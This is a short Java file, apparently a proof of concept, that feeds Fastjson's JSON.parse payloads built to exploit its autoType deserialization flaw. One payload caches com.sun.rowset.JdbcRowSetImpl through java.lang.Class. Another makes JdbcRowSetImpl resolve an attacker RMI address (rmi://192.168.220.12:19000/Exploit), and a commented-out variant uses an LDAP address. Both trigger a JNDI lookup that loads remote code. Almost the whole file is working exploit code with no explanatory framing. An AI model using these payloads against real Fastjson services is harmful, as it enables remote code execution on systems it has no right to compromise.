package rmi;

import com.alibaba.fastjson.JSON;

public class T {

	public static void main(String[] args) {
		// TODO Auto-generated method stub
    	// String s = "{ \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://10.10.10.81:1234/Exploit\",\"autoCommit\":true}";

        String payload1 = "{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}";
        JSON.parse(payload1);

        String payload2 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://192.168.220.12:19000/Exploit\",\"autoCommit\":true}";
        JSON.parse(payload2);
	}

}
